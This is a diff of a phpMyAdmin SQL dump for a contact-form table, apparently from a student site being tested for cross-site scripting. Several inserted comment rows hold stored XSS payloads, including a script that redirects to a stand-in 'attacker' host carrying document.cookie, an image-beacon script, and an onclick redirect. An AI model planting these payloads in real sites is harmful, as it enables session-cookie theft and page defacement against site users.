@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Host: 127.0.0.1
--- Generation Time: 07-Maio-2017 às 00:34
+-- Generation Time: 07-Maio-2017 às 03:53
 -- Versão do servidor: 10.1.21-MariaDB
 -- PHP Version: 5.6.30
 
@@ -62,8 +62,10 @@ CREATE TABLE `contato` (
 
 INSERT INTO `contato` (`contId`, `contNome`, `contEmail`, `contAssunto`, `contComent`) VALUES
 (1, 'ANA CLARA LOPES DA SILVA', 'ana.lopsil@gmail.com', 'asdasdas', 'asdasdas'),
-(2, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'asdasd', 'asd <script>alert(document.cookie)</script>'),
-(3, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'aaaa', 'asd <a href=# onclick=document.location=\'http://www.google.com\'>My Name</a>');
+(2, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'asdasd', 'asd <script>document.write(\'<img src=\"http://site.com?asdas=WASDASDASDASDASD\"/>\');document.write(\'<img src=\"https://s3.amazonaws.com/ceblog/wp-content/uploads/2016/04/22110359/youve-been-hacked.png\"/>\')</script>'),
+(3, 'ANA CLARA LOPES DA SILVA', 'asdas@asd.com', 'aaaa', 'asd <a href=# onclick=document.location=\'http://www.google.com\'>My Name</a>'),
+(4, 'sad', 'asdas@asd.com', 'asd', '<script>window.location=\'http://attacker/?cookie=\'+document.cookie </script> '),
+(5, 'das', 'dasd', 'asdas', '[removed][removed]=\'http://attacker/?cookie=\'+[removed] [removed]');
 
 -- --------------------------------------------------------
 
@@ -188,7 +190,7 @@ ALTER TABLE `trabalho`
 -- AUTO_INCREMENT for table `contato`
 --
 ALTER TABLE `contato`
-  MODIFY `contId` int(2) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
+  MODIFY `contId` int(2) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
 /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
